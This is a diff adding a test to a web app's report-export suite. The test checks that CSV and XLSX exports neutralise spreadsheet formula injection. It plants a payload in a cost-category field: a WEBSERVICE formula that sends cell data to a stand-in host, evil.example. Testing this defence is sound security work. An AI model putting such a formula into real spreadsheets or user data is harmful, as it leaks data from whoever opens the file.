@@ -294,6 +294,43 @@ def test_export_content_carries_the_data(client, seed, db):
     assert 120000 in vals or 120000.0 in vals
 
 
+def test_export_neutralizes_formula_injection(client, seed, db):
+    """CSV / spreadsheet formula injection (covers BOTH _csv and _xlsx): a user-authored
+    dimension value beginning with a formula trigger (= + - @) must be neutralized in
+    both report exports — rendered as literal apostrophe-prefixed text, never a live
+    formula (=WEBSERVICE / =HYPERLINK / legacy DDE)."""
+    from openpyxl import load_workbook
+
+    p = _login_director(client, seed, "a")
+    uid = seed["a"]["users"][ROLE_DIRECTOR].id
+    payload = '=WEBSERVICE("http://evil.example/?x="&A1)'
+    db.add(CostEntry(
+        project_id=p.id, company_id=p.company_id, entry_date=date(2026, 1, 10),
+        cost_category=payload, amount_try=D("1000"), vat_amount_try=D("0"),
+        total_with_vat_try=D("1000"), payment_status="unpaid", entry_type="actual",
+        created_by=uid,
+    ))
+    db.commit()
+    rid = client.post("/api/v1/studio/reports", json={
+        "title": "Enjeksiyon",
+        "spec": {"metrics": ["cost_try"], "dimensions": ["cost_category"], "viz": "table"},
+    }).json()["data"]["id"]
+
+    # CSV: the payload survives, but EVERY occurrence of the formula is apostrophe-
+    # prefixed, so no field begins with a bare trigger when the file is opened.
+    csv_text = client.post(f"/api/v1/studio/reports/{rid}/export?format=csv").content.decode("utf-8-sig")
+    assert "'=WEBSERVICE" in csv_text
+    assert csv_text.count("=WEBSERVICE") == csv_text.count("'=WEBSERVICE")
+
+    # XLSX: the cell is literal text, never a formula.
+    ws = load_workbook(io.BytesIO(
+        client.post(f"/api/v1/studio/reports/{rid}/export?format=xlsx").content)).active
+    cells = [c.value for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
+    assert any(v.startswith("'=WEBSERVICE") for v in cells)
+    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)
+    assert not any(v[:1] in ("=", "+", "-", "@") for v in cells)
+
+
 def test_export_cross_company_404(client, seed, db):
     rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="company", title="A")
     client.login(seed["b"]["users"][ROLE_DIRECTOR])
